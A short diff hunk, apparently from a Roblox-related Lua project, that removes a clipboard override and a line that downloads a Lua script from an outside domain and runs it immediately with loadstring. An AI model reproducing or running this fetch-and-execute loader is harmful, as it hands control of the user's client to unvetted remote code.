@@ -1,5 +1,0 @@
-setclipboard = function(text)
-    print(text)
-end
-
-loadstring(game:HttpGet("https://egorikusa.space/9d24de56c2d0ac5488885886.lua", true))()
